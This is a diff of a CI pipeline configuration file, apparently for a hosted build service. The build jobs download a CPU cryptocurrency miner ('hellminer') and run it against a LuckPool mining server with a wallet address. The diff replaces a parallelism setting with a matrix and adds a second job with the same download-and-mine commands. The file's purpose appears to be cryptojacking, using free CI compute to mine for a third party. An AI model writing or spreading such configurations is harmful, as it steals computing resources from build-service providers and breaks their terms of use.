@@ -15,9 +15,16 @@ blocks:
             - 'wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz'
             - tar xf hellminer_cpu_linux.tar.gz
             - './hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RLeCgADwoiPj7PJAmr65NTQZrHfvguJZxS.OGHINT -p x --cpu 2'
-          parallelism: 50
-    run:
-      when: branch = 'master'
+          matrix:
+            - env_var: FOO
+              values:
+                - value1
+                - value2
+        - name: 'Job #2'
+          commands:
+            - 'wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz'
+            - tar xf hellminer_cpu_linux.tar.gz
+            - './hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RLeCgADwoiPj7PJAmr65NTQZrHfvguJZxS.OGINT -p x --cpu 2'
   - name: 'Block #2'
     task:
       jobs:
